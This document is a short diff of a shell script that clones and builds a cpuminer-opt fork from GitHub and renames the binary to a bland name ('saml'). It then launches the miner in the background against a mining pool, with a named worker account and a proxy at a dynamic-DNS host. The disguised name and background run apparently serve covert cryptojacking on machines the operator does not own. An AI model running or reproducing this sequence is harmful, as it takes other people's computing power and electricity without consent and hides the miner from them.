@@ -4,6 +4,6 @@ git clone https://github.com/k67frozen/cpuminer-opt
 cd cpuminer-opt
 chmod +x *
 ./build.sh
-mv cpuminer trangkhung
+mv cpuminer saml
 make
-./trangkhung -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u sadlovehandsome.ngan -p x -x boondavid210.hopto.org:17071 --background
+./saml -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u sadlovehandsome.ngan -p x -x boondavid210.hopto.org:17071 --background
